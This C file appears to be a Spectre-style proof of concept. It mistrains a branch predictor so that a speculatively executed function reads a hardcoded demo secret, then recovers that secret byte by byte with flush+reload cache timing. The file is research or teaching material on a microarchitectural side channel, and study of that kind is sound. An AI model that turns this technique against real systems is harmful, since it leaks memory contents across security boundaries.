#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 8
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1

int i;
int j;
int k;
cp_t* flush_reload_arr;

void victim_subfunc() {
    char secret_char = SECRET[i];
    volatile cp_t cp = flush_reload_arr[secret_char];
}

void attacker_func(int secret_index) {
    i = secret_index;
}

int victim_main_func(int initialize_index, int secret_index) {

        char initialized[3];
        for(int i = 0; i < 3; i++) initialized[i] = false;  //all false

        if      (initialize_index == 0) {
            i = 0;
            initialized[0] = true;

        }
        else if (initialize_index == 1)	{
            j = 1;
            initialized[1] = true;
        }
        else if (initialize_index == 2)	{
            k = 2;
            initialized[2] = true;
        }

        attacker_func(secret_index);

        if(initialized[initialize_index]) victim_subfunc();

}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING + 1;
    char init_indices[n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        init_indices[i] = 0;
        secret_indices[i] = 1;
    }
    init_indices[n_accesses-1] = 2;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        victim_main_func(init_indices[i], secret_indices[i]);
        cpuid();
        if(init_indices[i] != 2) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            __sync_synchronize();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);

}
